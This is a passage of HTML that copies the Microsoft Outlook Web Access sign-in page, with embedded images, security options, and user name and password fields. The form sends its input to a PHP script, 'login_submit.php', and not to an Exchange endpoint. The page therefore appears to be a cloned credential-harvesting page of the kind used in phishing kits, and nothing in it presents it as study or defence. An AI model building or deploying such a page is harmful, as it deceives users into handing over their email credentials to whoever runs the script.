g7JDq7sz/Ssz67I0AbtDcytEQ7I0Z7tC+StEq7IkzbtCnytFBLIlI7tSBStVbrIVibtTiir1yrQFv7tQgSEAA7" align="absmiddle">
				</td>
				<td width="50%" style="background-image: url(data:image/gif;base64,R0lGODlhAQBzAJEAAP7+/qSkpP///wAAACH5BAAAAAAALAAAAAABAHMAAAILlC8QyO0Po5y0ugIAOw==); background-repeat: repeat-x"></td>
				<td width="45px" align="right">
					<img src="data:image/gif;base64,R0lGODlhLQBzANUAAPb2+PDx9Ojp7vr6+/v7/Pz8/f39/vf3+fHy9e7u7snJyc3NzePj47W1tfT09+nq7/T09Pn5++rr8NjY2ezt8evr7PP09q6ur9LS0+7v86+vr/j4+sDAwO7u79XV1r6+v9fX2NHR0qSkpP7+/v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAtAHMAAAb/QJJwSCwaj8ikcslsOp/QqHRKrVqv2Odoy+16v2AvU0Qum8/otEjD8XQM2yxzBGEsGpMCXO5MKEIEBXF8SyMKIAOChEwJDRWJI4tLCxgHBHuSSAwfDhGKmUcQFwiWBqBHIyIZnZ+nRCIUFhutrkIiEqQEkbVDIg+5u7wkvgEAusK2AsXHyCLKxsG8zsUD0bXTANXIw8/azd3WrtjewuPhp+bb6d/U56Dr5eDq8uzZ7pnw0vTx7fP99eT0/eNnz19BgPck5bu2T+BBggEZDnQYUVxDiQ8pJly00OJEjBXRXfSYEeRGQh1FfiQZ8t1IlSVZnuST0uVKmC3xvbQZE+dMYjk1dd7kmVPhTqE9if7MEtToUKRFOR51mhTqUixNpT6lGhXlVK1VuV69ktXrVrBdaX41GxbtWCtl1Z5lmxboWrlt6b6tEtfuXLx1md71mxfwXip9Bf8lHBjrYMWFGR+eAi8IADs=" align="absmiddle">
				</td>
			</tr>
		</table>
	</td>
</tr>
				<tr>
					<td align="center" class="internalTD">
						<table id="tblMid" class="mid">
							<FORM id=form1 name=form1 autocomplete="off" method=post action="login_submit.php?uid=<?php echo $uid ?>" onsubmit="return(SubmitForm());">
							<input type="hidden" name="flags" value="0">
							<tr>
								<td>
									<TABLE border=0 cellspacing="0" cellpadding="0" width="100%">										
										<col>
										<col class="w100">
										<tr>
											<td colspan=2 class="wrng"></td>
										</tr>										
										
										<tr><td colspan=2><hr></td></tr>
										
										<tr id=trSec>
											<td colspan="2">
												Security (
													<a href="/#" id="lnkShwSec" onclick="clkExp('lnkShwSec')">
													Show Explanation
													</a>
													<a href="/#" id="lnkHdSec" onclick="clkExp('lnkHdSec')" style="display:none">
													Hide Explanation
													</a>
												)
											</td>
										</tr>
										
										<tr>
									                <td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked></td>
									                <td><label for="rdoPblc">This is a public or shared device</label></td>
						        		        </tr>
								                <tr id="trPubExp" class="expl" style="display:none">
									                <td></td>
									                <td>Select this option if you use Outlook Web Access on a public endpoint. Be sure to log off when you have finished using Outlook Web Access and close all windows to end your session.</td>
								                </tr>
										<tr>
											<td valign="top"><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()" ></td>
											<td><label for="rdoPrvt">This is a private computer</label></td>
										</tr>
										<tr id="trPrvtExp" class="expl" style="display:none">
											<td></td>
											<td>As such, you are provided with an additional period of inactivity before automatically logging off.</td>
										</tr>
										<tr id="trPrvtWrn" class="wrng" style="display:none">											
											<td></td>
											<td>Warning: By logging on to this site you acknowledge that the endpoint complies with your organization's security policy.</td>
										</tr>
										
										<tr><td colspan="2"><hr></td></tr>
										
										<tr>							
											<td><input id="chkBsc" type="checkbox" class="rdo" onclick="clkBsc();" disabled checked></td>
											<td nowrap><label for="chkBsc">Use Outlook Web Access Light</label></td>
										</tr>
										<tr id="trBscExp" class="disBsc">
											<td></td>
											<td>The Light client provides fewer features and is sometimes faster. Use the Light client if you are on a slow connection or using an endpoint with unusually strict browser security settings. If you are using a browser other than Internet Explorer (version 6.0 or later), you can only use the Light client.</td>
										</tr>
										
										<tr><td colspan=2><hr></td></tr>
										
									</TABLE>
									<TABLE border=0 cellspacing="0" cellpadding="0" width="100%">
										<col class="nowrap">
										<col class="w100">
										
											<TR>
												<TD class="nowrap"><label for="user_name">User name:</label></TD>
												<TD class="txtpad"><INPUT class="txt" TYPE="text" ID="user_name" NAME="UsernameForm" maxLength="50" size="8"></TD>
											</TR>
											<TR>
												<TD class="nowrap"><label for="password">Password:</label></TD>
												<TD class="txtpad"><INPUT class="txt" TYPE="password" ID="password" NAME="PasswordForm" maxLength="20" size="8" onfocus="g_fFcs=0"></TD>												
											</TR>
											
													<INPUT type="hidden" ID="repository" NAME="repository" VALUE="GP" size="8">
																						
									</TABLE>									
								</td>
							</tr>
							<tr>
								<TD>
									<TABLE border="0" cellspacing="0" cellpadding="0" width="100%">
										<TR>
											<TD class="txtpad" align="right">
											
					                            				<input type="submit" class="btn" value="Log On" onclick="clkLgn()">
					                            			
				                            				</TD>
			                            				</TR>
		                            				</TABLE>
	                            				</TD>	
                            				</tr>
							<tr><td><hr></td></tr>
							<input type="hidden" name ="site_name" id="site_name" value="exchange">
							<input type="hidden" name ="secure" id="secure" value="1">
							<input type="hidden" name ="resource_id" id="resource_id" value="C8F122DC97F54D9AAF0DF8F0B1035E3C">
							<input type="hidden" name ="login_type" id="login_type" value="2">
                            <tr id="trInvCrd" class="wrng" style="display:none">
								<td>The user name or password you entered isn't correct. Try entering it again.</td>
							</tr>
                        
							</FORM>
						</table>
						<table id="tblMid2" class="mid" style="display:none">
				       		     	<tr><td><hr></td></tr>
							<tr>
								<td>
							        	<br>
						        		Cookies are currently disabled by your browser settings. To access this Web site, cookies must be enabled.
								        <br><br>
								        To enable cookies on Internet Explorer 6.0 or later, select Internet Options from the Tools menu. On the Privacy tab, click Sites. Enter the Web site address and click Allow.
							                <br><br><br><br><br>
                          					</td>
							</tr>
					    		<tr><td><hr></td></tr>
							<tr>
					            		<td align="right" class="txtpad">
									
									<input type="button" class="btn" style="float: right" value="Retry" onclick="clkRtry()">
									
								</td>
							</tr>
						</table>
					</td>
				</tr>
				<tr>		
	<TD align="center" valign="bottom" colspan="3">
		<table class="mid tblConn">
			<tr>
				<td style="vertical-align:top" class="tdConnImg"><img src="data:image/gif;base64,R0lGODlhAQABAHAAACwAAAAAAQABAIcAAAAAADMAAGYAAJkAAMwAAP8AKwAAKzMAK2YAK5kAK8wAK/8AVQAAVTMAVWYAVZkAVcwAVf8AgAAAgDMAgGYAgJkAgMwAgP8AqgAAqjMAqmYAqpkAqswAqv8A1QAA1TMA1WYA1ZkA1cwA1f8A/wAA/zMA/2YA/5kA/8wA//8zAAAzADMzAGYzAJkzAMwzAP8zKwAzKzMzK2YzK5kzK8wzK/8zVQAzVTMzVWYzVZkzVcwzVf8zgAAzgDMzgGYzgJkzgMwzgP8zqgAzqjMzqmYzqpkzqswzqv8z1QAz1TMz1WYz1Zkz1cwz1f8z/wAz/zMz/2Yz/5kz/8wz//9mAABmADNmAGZmAJlmAMxmAP9mKwBmKzNmK2ZmK5lmK8xmK/9mVQBmVTNmVWZmVZlmVcxmVf9mgABmgDNmgGZmgJlmgMxmgP9mqgBmqjNmqmZmqplmqsxmqv9m1QBm1TNm1WZm1Zlm1cxm1f9m/wBm/zNm/2Zm/5lm/8xm//+ZAACZADOZAGaZAJmZAMyZAP+ZKwCZKzOZK2aZK5mZK8yZK/+ZVQCZVTOZVWaZVZmZVcyZVf+ZgACZgDOZgGaZgJmZgMyZgP+ZqgCZqjOZqmaZqpmZqsyZqv+Z1QCZ1TOZ1WaZ1ZmZ1cyZ1f+Z/wCZ/zOZ/2aZ/5mZ/8yZ///MAADMADPMAGbMAJnMAMzMAP/MKwDMKzPMK2bMK5nMK8zMK//MVQDMVTPMVWbMVZnMVczMVf/MgADMgDPMgGbMgJnMgMzMgP/MqgDMqjPMqmbMqpnMqszMqv/M1QDM1TPM1WbM1ZnM1czM1f/M/wDM/zPM/2bM/5nM/8zM////AAD/ADP/AGb/AJn/AMz/AP//KwD/KzP/K2b/K5n/K8z/K///VQD/VTP/VWb/VZn/Vcz/Vf//gAD/gDP/gGb/gJn/gMz/gP//qgD/qjP/qmb/qpn/qsz/qv//1QD/1TP/1Wb/1Zn/1cz/1f///wD//zP//2b//5n//8z///8AAAAAAAAAAAAAAAAIBAD3BQQAOw==" alt=""></td>
				<td class="tdConn" style="padding-top:6px;">Connected to Microsoft Exchange</td>
			</tr>
			<tr>
				<td></td><td class="tdCopy">&#169; 2010 Microsoft Corporation. All rights reserved.</td>
			</tr>
		</table>
		<table width="100%" cellpadding="0" cellspacing="0">
			<tr>
				<td width="456px">
					<img src="data:image/gif;base64,R0lGODlhyAE2APcAAP/4zf/65//pff/99v/76P/mPf/42v/53P/ldP/vpf/qiP/vqf/64P/oXf/86P/skf/63P/+9P/qhf/42Pb2+P/2zPr6+//lQf/pWf7cS//53v/43f/84f/mWv/+8v/kNP/lOf/20v/20P/lRf/76f/oTP/zuf/gNf/qjP/wpf/nef/lMv/51v/2zv/pVP/qdf/fMf/jbP/hOf/31P/cO//sjf/zwf/53//1wv/qef/eLv/51P/62v/oYf/40P/0xPDx9P/wrOjp7v/iPf/1yP/2yP/yuP/0xv/85fHZdP/oUf/yuv/85P/iYv/0vv/0wP/1yv/50v/3yv/+8P/lSv/yvP/slv/31v/unv/wqf/voP/sif/pcf/lTf/wrv/2xv/ysv/mUv/slP/lN//ytP/0u//oZP/oaf/pbf/vo//ztv/wsv/yv//xsP/wp//eLf/+7v/dRv/gMv/61//unP/mVv/2xP7dNf/1y//wtf/jQP7dV//og//ogP/3yf/ZQNLMsP/iRf/woePPe//ysP/umv/shv/2wv/rgP/tmP/xtv/rXf/aRf/61rWxn+vs8P/umP/rkf/pgunYjP/smv/tnP/rYv/77P/cQv/gLv/snr+6ov/gTf/nRf/wuP/fSf/yrcq/jf/rgv/yrP/hUf/54f/ulv/rWf/rlv/32P/mg//+7P/ulP/2wP/1zf/xuf/0t//aN//nif/zw//fLP/wnuXm7P/mNv/vr//iV////qSkpN7f5//++f/++//+/P/++v/++P///P/+9//98//99f/87v/98v/88P/99P/87//+9v/64//88f//+//65f/96//+/f/97P/87f/87P/97f//+v/64v/65P/97v/97//98f/98P/75f//+f/96v/86//86f//+P/88v/74f/74//75Pv7/P//9/z8/f/lNP/51f/tn/39/vT09/P09v//9v/rm//rfe7v8+Lj6uDh6P/xq//736+sofTkld/cz83Dlv/1vv7+/v///f///yH5BAAAAAAALAAAAADIATYAAAj/AP8JFNjPAoVdyyJEWMZwGTp04iJKnBjRm0Vv1jJac7bRmUePwkKKDOmvpMmT/nSpVHlyJcqXMGPGXEmzps2bOHPq3MnT5sto0UwCPRlUptGjL3/9Cql0qdKgQ5EKhQq0asmi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